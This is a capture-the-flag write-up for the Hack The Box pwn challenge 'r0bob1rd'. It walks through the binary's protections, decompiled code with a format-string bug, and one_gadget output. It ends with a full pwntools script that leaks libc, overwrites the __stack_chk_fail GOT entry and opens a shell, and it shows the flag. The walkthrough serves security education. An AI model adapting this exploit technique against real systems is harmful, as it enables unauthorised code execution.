# R0bob1rd Challenge

### Context

This _pwn_ challenge presents a 64-bit ELF binary named `r0bob1rd`, which implements interactive functionality for selecting and describing a `r0bob1rd`. Despite its innocent appearance, the program exhibits several classic C vulnerabilities, such as the use of raw `printf(buffer)` and the lack of proper validation when reading memory and user input.

The objective of the challenge is to exploit a _format string_ condition to dynamically overwrite the address of the _GOT entry_ of `__stack_chk_fail`, initially to redirect execution back to `main()` and subsequently to a _one_gadget_ in `libc` to obtain a shell. A custom version of `glibc` is used, which adds an extra layer of complexity to the environment.

### Solution

#### Requirements

- checksec
- ghidra
- gdb
- one_gadget

#### Step 1 - Check the binary prote

The `r0bob1rd` executable is provided along with a glibc/ directory containing a version-specific `libc` and its `loader (ld.so.2)`. Running file `r0bob1rd` gives us:

```bash
file r0bob1rd

r0bob1rd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c9a820fb2cb5f6e3fb6df9103ea375f00d80cf6c, not stripped
```

This indicates that the binary was compiled for a specific version of glibc and is not stripped, making it easier to analyze.

The binary's protections are reviewed, giving us a preview of the steps to exploit this file.

```bash
pwn checksec r0bob1rd
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    Stripped:   No
```

#### Step 2 - Analyze the code

When reviewing the code in Ghidra, it was found that there was an error in the `operation` function, where it could be observed that the `buffer` variable that at the beginning is declared with a value of 104, at the end it overflows by 106, a classic `printf(user_input)` vulnerability is also observed without protection for format strings, there is also a `Stack Canary`, and if it is overwritten, `__stack_chk_fail()` is called, this function is part of `GOT` and can be written thanks to `Partial RELRO`.

```c
void operation(void)
{
  long in_FS_OFFSET;
  int number;
  char buffer [104];
  long canary;

  canary = *(long *)(in_FS_OFFSET + 40);
  printf("\nSelect a R0bob1rd > ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400eb5,&number);
  if ((number < 0) || (9 < number)) {
    printf("\nYou\'ve chosen: %s",robobirdNames + (long)number * 8);
  }
  else {
    printf("\nYou\'ve chosen: %s",*(undefined8 *)(robobirdNames + (long)number * 8));
  }
  getchar();
  puts("\n\nEnter bird\'s little description");
  printf("> ");
  fgets(buffer,106,stdin);
  puts("Crafting..");
  usleep(2000000);
  start_screen();
  puts("[Description]");
  printf(buffer);
  if (canary != *(long *)(in_FS_OFFSET + 40)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

#### Step 3 - Exploit Strategy

Exploring the packets in this `one_gadget` process, we found the second candidate. As you can see below, R15 points to null and RDX is not -> `0x1`. However, another OR condition indicates that if RDX is an envp, we can use it.

- To verify this, we can simply run break in main and then query -> `x/s *(char **) $rdx.`

```bash
one_gadget glibc/libc.so.6

0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

#### Step 4 - Create the script

The script seeks to filter a libc address using `format string`, then enter to calculate the base of `libc`, and overwrite `__stack_chk_fail@GOT` with the address of a `one_gadget`, thereby triggering the stack smash and gaining execution, which will allow us to read the flag.

```python
from pwn import *
import os

os.system("clear")


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
continue
"""

exe = "./r0bob1rd"
elf = context.binary = ELF(exe, checksec=True)
context.log_level = "INFO"

library = "glibc/libc.so.6"
libc = context.binary = ELF(library, checksec=False)

sh = start()

## STAGE 1: Leak and Parse LIBC Runtime Leak + Relocate LIBC Base

sh.sendlineafter(b">", b"-8")

sh.recvuntil(b"sen: ")
get = unpack(sh.recv(6) + b"\x00" * 2)
log.info(f"RECEIVED --> {hex(get)}")
libc.address = get - libc.sym["setvbuf"]
log.success(f"LIBC BASE -> {hex(libc.address)}")

gadgets = (0xE3AFE, 0xE3B01, 0xE3B04)
one_gadget = libc.address + gadgets[1]
log.success(f"ONE GADGET --> {hex(one_gadget)}")

## STAGE 2: Overwrite _stack_chk_fail() + Trigger it

payload = fmtstr_payload(
    8, {elf.got["__stack_chk_fail"]: one_gadget}, write_size="short"
)

sh.sendlineafter(b">", payload.ljust(106, b"\x90"))
# gdb.attach(sh)

sh.interactive()
```

#### Step 5 - Flag

```bash
$ cat flag.txt
HTB{S0m3t1m3s_bl0w1ng_th3_pr0gr4m_1s_g00d}
```
